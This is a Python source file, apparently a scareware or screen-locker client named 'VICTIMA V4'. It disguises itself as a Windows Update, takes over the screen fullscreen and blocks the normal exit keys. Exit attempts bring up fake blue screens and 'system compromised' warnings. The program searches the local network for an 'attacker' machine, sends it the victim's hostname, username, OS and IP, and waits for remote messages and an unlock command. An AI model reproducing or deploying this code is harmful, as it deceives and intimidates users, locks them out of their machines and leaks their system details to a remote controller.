# -*- coding: utf-8 -*-
"""
VICTIMA V4 - Auto-discovery del atacante via UDP broadcast
No necesita configurar IP manualmente. Escucha broadcasts y se conecta.
"""
import tkinter as tk
from tkinter import messagebox
import socket, threading, sys, os, time, random, ctypes, platform, subprocess

PUERTO_TCP = 5555
PUERTO_UDP = 5556
PASSWORD = "acuario"
MAX_INTENTOS = 3
TIMEOUT = 20

C = {'bg':'#0a0a0a','dark':'#0d1117','red':'#ff0040','green':'#00ff41',
     'gray':'#333','white':'#c9d1d9','accent':'#ff6600'}

class VictimaV4:
    def __init__(self):
        self.atacante_ip = None
        self.atacante_port = PUERTO_TCP
        self.sock = None
        self.conectado = False
        self.intentos = 0
        self.tiempo = TIMEOUT
        self.bloqueado = False
        self.intento_salir = 0
        self.pc_info = self._recoger_info()

        self.v = tk.Tk()
        self.v.title("Windows Update")
        self.v.geometry("400x300+500+300")
        self.v.configure(bg=C['bg'])
        self.v.resizable(False, False)
        self.v.attributes("-topmost", True)

        self.v.protocol("WM_DELETE_WINDOW", self._on_exit)
        self.v.bind("<Alt-F4>", lambda e: self._on_exit())
        self.v.bind("<Control-Alt-KeyPress-F1>", lambda e: self.v.destroy())
        self.v.bind("<F1>", lambda e: self._on_exit())
        self.v.bind("<Escape>", lambda e: self._on_exit())

        self._ventana_chica()
        # Auto-descubrimiento del atacante
        threading.Thread(target=self._auto_find_attacker, daemon=True).start()

    # =========================================================================
    # AUTO-DESCUBRIMIENTO DEL ATACANTE
    # =========================================================================

    def _auto_find_attacker(self):
        """Escucha broadcasts UDP para encontrar al atacante"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.settimeout(0.5)

        try:
            sock.bind(("0.0.0.0", PUERTO_UDP))
        except:
            pass

        tiempo_max = 15  # segundos esperando broadcast
        inicio = time.time()

        while time.time() - inicio < tiempo_max and not self.atacante_ip:
            try:
                data, addr = sock.recvfrom(2048)
                msg = data.decode("utf-8").strip()
                if msg.startswith("ATACANTE_AQUI:"):
                    partes = msg.split(":")
                    ip = partes[1]
                    puerto = int(partes[2]) if len(partes) > 2 else PUERTO_TCP
                    self.atacante_ip = ip
                    self.atacante_port = puerto
                    # Si hay ngrok URL
                    if len(partes) > 3:
                        self.ngrok_url = partes[3]
                    break
            except socket.timeout:
                continue
            except:
                continue

        sock.close()

        # Si no encontro broadcast, escanear subredes comunes
        if not self.atacante_ip:
            self._escanear_subredes()

        # Conectar al atacante
        if self.atacante_ip:
            self._conectar_tcp()
        else:
            self._conectar_tcp()  # Intenta igual con defaults

    def _escanear_subredes(self):
        """Escaneo rapido de subredes comunes para encontrar al atacante"""
        ip_local = self._get_ip()
        partes = ip_local.split(".")
        if len(partes) == 4:
            subred = f"{partes[0]}.{partes[1]}.{partes[2]}"
            # Probar puerta de enlace comun
            for gateway in [1, 254]:
                ip = f"{subred}.{gateway}"
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.3)
                    s.connect((ip, PUERTO_TCP))
                    s.close()
                    self.atacante_ip = ip
                    self.atacante_port = PUERTO_TCP
                    return
                except:
                    continue
        # Si falla, usar IPs comunes de VMware
        for ip in ["192.168.163.1", "192.168.163.129", "192.168.1.1", "10.0.2.2"]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                s.connect((ip, PUERTO_TCP))
                s.close()
                self.atacante_ip = ip
                self.atacante_port = PUERTO_TCP
                return
            except:
                continue

    def _conectar_tcp(self):
        """Conecta al atacante via TCP"""
        ip = self.atacante_ip or "127.0.0.1"
        for i in range(20):
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(3)
                self.sock.connect((ip, self.atacante_port))
                self.conectado = True
                # Enviar info
                try:
                    self.sock.send(f"[IP]{self._get_ip()}\n[PCINFO]Hostname: {self.pc_info['hostname']} | Usuario: {self.pc_info['usuario']} | OS: {self.pc_info['os']} | IP: {self._get_ip()}".encode("utf-8"))
                except: pass
                return
            except:
                time.sleep(2)

    # =========================================================================
    # VENTANA CHICA INICIAL
    # =========================================================================

    def _ventana_chica(self):
        f = tk.Frame(self.v, bg=C['dark'], padx=20, pady=15)
        f.pack(fill="both", expand=True)
        tk.Label(f, text="Windows Update", bg=C['dark'], fg=C['white'],
                 font=("Segoe UI", 12, "bold")).pack(anchor="w")
        tk.Label(f, text="Actualizando sistema... (1 de 3)",
                 bg=C['dark'], fg=C['gray'], font=("Segoe UI", 9)).pack(anchor="w", pady=5)
        self.canvas = tk.Canvas(f, bg=C['dark'], highlightthickness=0, height=20)
        self.canvas.pack(fill="x")
        self.canvas.create_rectangle(5, 5, 350, 18, fill=C['gray'], outline="")
        self.barra = self.canvas.create_rectangle(5, 5, 5, 18, fill=C['green'], outline="")
        tk.Label(f, text="No apague su equipo durante la actualizacion.",
                 bg=C['dark'], fg="#666", font=("Segoe UI", 8)).pack(pady=10)
        self.estado = tk.Label(f, text="Preparando...", bg=C['dark'], fg=C['white'],
                                font=("Consolas", 8))
        self.estado.pack()
        self._anim_barra()

    def _anim_barra(self):
        def a(p=0):
            if p>100 or self.bloqueado: return
            try:
                self.canvas.coords(self.barra, 5, 5, 5+(345*p)//100, 18)
                self.estado.config(text=f"Actualizando... {p}%")
            except: pass
            self.v.after(30, lambda: a(p+random.randint(1,3)))
        a()
        self.v.after(3500, self._expandir)

    def _expandir(self):
        if self.bloqueado: return
        self.v.attributes("-fullscreen", True)
        self.v.geometry("")
        for w in self.v.winfo_children(): w.destroy()
        self._falsa_actualizacion()

    def _falsa_actualizacion(self):
        self.canvas = tk.Canvas(self.v, bg=C['bg'], highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)
        self.canvas.create_rectangle(0,0,2000,30, fill="#1a1a2e", outline="")
        self.canvas.create_text(15,15, anchor="w", text="Windows Update",
                                fill="#888", font=("Segoe UI", 9))
        cx, cy = 960, 400
        self.canvas.create_text(cx, cy-80, text="Actualizando Windows",
                                fill=C['white'], font=("Segoe UI", 24))
        self.canvas.create_text(cx, cy-40, text="No apague su equipo.",
                                fill=C['gray'], font=("Segoe UI", 12))
        self.canvas.create_rectangle(cx-200, cy, cx+200, cy+20,
                                      fill=C['gray'], outline="")
        self.barra2 = self.canvas.create_rectangle(cx-200, cy, cx-200, cy+20,
                                                    fill=C['green'], outline="")
        self.estado2 = self.canvas.create_text(cx, cy+40, text="",
                                               fill=C['white'], font=("Consolas", 10))
        self._anim_barra2()

    def _anim_barra2(self):
        def a(p=0):
            if p>100 or self.bloqueado: return
            try:
                x = -200 + (400*p)//100
                self.canvas.coords(self.barra2, 960-200, 400, 960-200+x, 420)
            except: pass
            self.v.after(40, lambda: a(p+random.randint(1,4)))
        a()
        self.v.after(4000, self._panel_voz)

    def _panel_voz(self):
        if self.bloqueado: return
        for w in self.v.winfo_children(): w.destroy()
        self.v.title("Voice Control Pro v3.2")
        f = tk.Frame(self.v, bg=C['dark'], padx=40, pady=30)
        f.place(relx=0.5, rely=0.5, anchor="c")
        tk.Label(f, text="VOICE CONTROL PRO v3.2", bg=C['dark'], fg="#0f3460",
                 font=("Arial", 22, "bold")).pack()
        tk.Label(f, text="[ CONECTADO ]", bg=C['dark'], fg=C['green'],
                 font=("Consolas", 9)).pack(pady=(0,15))
        tk.Button(f, text="INICIAR SESION", bg="#0f3460", fg="white",
                  font=("Arial",11,"bold"), padx=20, pady=8, bd=0,
                  command=self._auth).pack(pady=20)
        self.fa = tk.Frame(f, bg=C['dark'])
        tk.Label(self.fa, text="CONTRASENA:", bg=C['dark'], fg=C['red'],
                 font=("Consolas",10,"bold")).pack()
        self.e = tk.Entry(self.fa, show="*", bg="#0f3460", fg="white",
                          font=("Consolas",14), justify="c", width=20)
        self.e.pack(pady=5)
        self.e.bind("<Return>", lambda e: self._check())
        tk.Button(self.fa, text="VERIFICAR", bg=C['red'], fg="white",
                  bd=0, padx=15, command=self._check).pack()
        self.fb = tk.Label(self.fa, text="", bg=C['dark'], fg=C['red'],
                           font=("Consolas",9))
        self.fb.pack()
        self.tl = tk.Label(self.fa, text="", bg=C['dark'], fg=C['gray'],
                           font=("Consolas",9))
        self.tl.pack()
        self._timer()

    def _auth(self):
        self.fa.pack(fill="x", pady=5)
        self.e.focus(); self.tiempo = TIMEOUT

    def _check(self):
        if self.bloqueado: return
        if self.e.get() == PASSWORD:
            messagebox.showinfo("OK", "Acceso concedido")
            self.v.destroy()
        else:
            self.intentos += 1; r = MAX_INTENTOS - self.intentos
            self.fb.config(text=f"Error - Intentos restantes: {r}")
            self.e.delete(0, tk.END)
            if self.intentos >= MAX_INTENTOS: self._bloquear()

    # =========================================================================
    # INTENTO DE SALIDA
    # =========================================================================

    def _on_exit(self):
        self.intento_salir += 1
        self._enviar_info()
        if self.intento_salir == 1:
            self._fake_bsod("CRITICAL_PROCESS_DIED")
        elif self.intento_salir == 2:
            self._fake_bsod("SYSTEM_SERVICE_EXCEPTION")
        elif self.intento_salir == 3:
            self._fake_virus()
        else:
            self._pantalla_roja()

    def _fake_bsod(self, error):
        for w in self.v.winfo_children(): w.destroy()
        self.v.configure(bg="#0000AA")
        self.v.attributes("-fullscreen", True)
        tk.Label(self.v, text=":(  Tu sistema tuvo un problema",
                 bg="#0000AA", fg="white", font=("Segoe UI", 18, "bold"),
                 wraplength=700).place(relx=0.5, rely=0.4, anchor="c")
        tk.Label(self.v, text=f"{error}\n\nRecolectando informacion del error...",
                 bg="#0000AA", fg="white", font=("Consolas", 11),
                 wraplength=700).place(relx=0.5, rely=0.55, anchor="c")
        tk.Label(self.v, text="\n\n\n\n\n\nPresione Ctrl+Shift+F1 para cancelar",
                 bg="#0000AA", fg="#6666FF", font=("Consolas", 9)).place(relx=0.5, rely=0.7, anchor="c")
        self.v.after(3000, lambda: self._bloquear() if not self.bloqueado else None)

    def _fake_virus(self):
        for w in self.v.winfo_children(): w.destroy()
        self.v.configure(bg="black")
        self.v.attributes("-fullscreen", True)
        for i in range(25):
            x = random.randint(100, 1800); y = random.randint(100, 900)
            tk.Label(self.v, text=random.choice(["WARNING","HAXOR","LOCKED","!!"]),
                     bg="black", fg=random.choice(["red","green","yellow"]),
                     font=("Arial", random.randint(14,28))).place(x=x, y=y)
        tk.Label(self.v, text="SISTEMA BLOQUEADO",
                 bg="black", fg="red", font=("Arial", 30, "bold")).place(relx=0.5, rely=0.3, anchor="c")
        tk.Label(self.v, text="\n\n\nCtrl+Shift+F1 para salir",
                 bg="black", fg="#333", font=("Consolas", 9)).place(relx=0.5, rely=0.6, anchor="c")

    def _pantalla_roja(self):
        for w in self.v.winfo_children(): w.destroy()
        self.v.configure(bg="#8B0000")
        self.v.attributes("-fullscreen", True)
        tk.Label(self.v, text="BLOQUEADO",
                 bg="#8B0000", fg="white", font=("Arial", 40, "bold")).place(relx=0.5, rely=0.5, anchor="c")
        self._enviar_info()

    # =========================================================================
    # INFO PC
    # =========================================================================

    def _recoger_info(self):
        info = {
            "hostname": socket.gethostname(),
            "usuario": os.environ.get("USERNAME", "?"),
            "os": platform.platform(),
            "procesador": platform.processor(),
            "arquitectura": platform.machine(),
        }
        return info

    def _enviar_info(self):
        if not self.sock or not self.conectado: return
        try:
            msg = f"[PCINFO]Hostname: {self.pc_info['hostname']} | Usuario: {self.pc_info['usuario']} | OS: {self.pc_info['os']} | IP: {self._get_ip()}"
            self.sock.send(msg.encode("utf-8"))
        except: pass

    def _get_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
            return ip
        except: return "127.0.0.1"

    # =========================================================================
    # BLOQUEO
    # =========================================================================

    def _bloquear(self):
        if self.bloqueado: return
        self.bloqueado = True
        for w in self.v.winfo_children(): w.destroy()
        self.v.configure(bg=C['bg'])
        self.v.attributes("-fullscreen", True)
        f = tk.Frame(self.v, bg=C['bg'])
        f.place(relx=0.5, rely=0.5, anchor="c")
        tk.Label(f, text="!", bg=C['bg'], fg=C['red'],
                 font=("Arial", 40, "bold")).pack()
        t = tk.Label(f, text="SISTEMA COMPROMETIDO", bg=C['bg'], fg=C['red'],
                     font=("Consolas", 26, "bold"))
        t.pack()
        info = tk.Frame(f, bg=C['bg'])
        info.pack(pady=15)
        for label, estado in [("Windows Defender","DESACTIVADO"),
                               ("Firewall","DESACTIVADO"),
                               ("Microfono","ACCESO REMOTO"),
                               ("Sistema","BLOQUEADO")]:
            r = tk.Frame(info, bg=C['bg'])
            r.pack(fill="x", pady=1)
            tk.Label(r, text=f"  {label}:", bg=C['bg'], fg=C['white'],
                     font=("Consolas",11), width=22, anchor="w").pack(side="left")
            tk.Label(r, text=estado, bg=C['bg'], fg=C['red'],
                     font=("Consolas",11,"bold")).pack(side="right")
        tk.Frame(f, bg=C['gray'], height=1).pack(fill="x", pady=10)
        self.console = tk.Text(f, bg=C['bg'], fg=C['green'],
                               font=("Consolas",11), bd=0,
                               highlightthickness=0, width=65, height=8,
                               state="disabled")
        self.console.pack(pady=5)
        self.flash = tk.Label(f, text="", bg=C['bg'], fg=C['green'],
                              font=("Consolas", 13, "bold"))
        self.flash.pack()
        self._am("[SYSTEM] Conectado a servidor remoto")
        self._am("[SYSTEM] Esperando instrucciones...")
        threading.Thread(target=self._recibir, daemon=True).start()

    def _am(self, t):
        try:
            self.console.config(state="normal")
            self.console.insert("end", f">> {t}\n")
            self.console.see("end"); self.console.config(state="disabled")
        except: pass

    def _mm(self, t):
        try: self.flash.config(text=f">> {t}")
        except: pass

    def _recibir(self):
        while self.bloqueado:
            if self.sock and self.conectado:
                try:
                    self.sock.settimeout(1)
                    d = self.sock.recv(1024)
                    if not d: break
                    m = d.decode("utf-8").strip()
                    if m == "[UNLOCK]":
                        self._am("[SYSTEM] Desbloqueando...")
                        time.sleep(0.5); self.v.destroy(); return
                    elif m.startswith("[PCINFO]"): continue
                    else: self._am(f">> {m}"); self._mm(m)
                except socket.timeout: continue
                except: self._am("[SYSTEM] Conexion perdida"); break
            time.sleep(0.5)

    def _timer(self):
        if self.bloqueado: return
        try:
            if self.fa.winfo_ismapped():
                self.tiempo -= 1; self.tl.config(text=f"Tiempo: {self.tiempo}s")
                if self.tiempo <= 0:
                    self.intentos += 1; r = MAX_INTENTOS - self.intentos
                    self.fb.config(text=f"Timeout - Intentos: {r}")
                    self.tiempo = TIMEOUT
                    if self.intentos >= MAX_INTENTOS: self._bloquear()
        except: pass
        self.v.after(1000, self._timer)

    def run(self): self.v.mainloop()

if __name__ == "__main__":
    v = VictimaV4(); v.run()
